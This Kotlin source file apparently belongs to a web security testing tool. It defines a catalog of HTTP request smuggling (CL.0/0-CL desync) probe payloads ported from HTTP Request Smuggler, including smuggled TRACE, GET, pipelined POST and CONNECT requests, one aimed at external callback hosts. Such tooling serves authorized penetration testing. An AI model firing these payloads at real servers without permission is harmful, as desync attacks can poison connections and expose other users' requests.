package io.bitbytelab.raijin.turbo

/**
 * The catalog of smuggled-request bodies used as the CL.0/0-CL desync probe (and as follow-up
 * payloads once a desync is suspected) — ported from HTTP Request Smuggler's `ProbePayloads`
 * (same catalog; canary injection is applied externally via [DesyncCanary], not built in here,
 * matching upstream's own separation). Exposed to Jython Turbo scripts as
 * `turbo.DesyncProbePayloads` (see [TurboPython.types]).
 */
object DesyncProbePayloads {

    /** @property supports0CL False for payloads only meaningful once a desync is already confirmed (not as the initial 0-CL probe itself). */
    data class Payload(val id: Int, val body: String, val isDefault: Boolean, val supports0CL: Boolean = true)

    val PAYLOADS: List<Payload> = listOf(
        Payload(0, "TRACE /asdf HTTP/1.1\r\nA: B", isDefault = true),
        Payload(1, "X", isDefault = false, supports0CL = false),
        Payload(2, "GET / HTTP/1.1\r\nX: Y", isDefault = false),
        Payload(3, "GET /favicon.ico HTTP/1.1\r\nX: Y", isDefault = false),
        Payload(4, "GET /asdf HTTP/1.1\r\nX: Y", isDefault = false),
        Payload(5, "GET /0-9 HTTP/0.9\r\nX: Y", isDefault = false),
        Payload(6, "GET /invalid HTTP/1.2\r\nX: Y", isDefault = false),
        Payload(7, "TRACE / HTTP/1.1\r\nX: Y", isDefault = false),
        Payload(8, "GET /%2f HTTP/1.1\r\nX: Y", isDefault = false),
        Payload(9, "POST / HTTP/1.1\r\nHost: localhost\r\nConnection: keep-alive\r\nContent-Length: 10\r\n\r\nx=1", isDefault = false, supports0CL = false),
        Payload(10, "GET /?rqp HTTP/1.1\r\nHost: localhost\r\nConnection: keep-alive\r\n\r\n", isDefault = false, supports0CL = false),
        Payload(11, "GET / HTTP/1.1\r\nHost: localhost\r\nConnection: keep-alive\r\n\r\nGET / HTTP/1.1\r\nX: Y", isDefault = false, supports0CL = false),
        Payload(
            12,
            "CONNECT n1p4fbvwvalvyvljgp8a3zts4jaay5mu.psres.net:443\r\nHost: ob35pc5x5bvw8wvkqqibd03tekkb85wu.psres.net\r\n\r\n",
            isDefault = false, supports0CL = false,
        ),
    )

    @JvmStatic fun defaultPayload(): Payload = PAYLOADS.first { it.isDefault }
    @JvmStatic fun randomPayload(): Payload = PAYLOADS.random()
    @JvmStatic fun byId(id: Int): Payload? = PAYLOADS.firstOrNull { it.id == id }
}
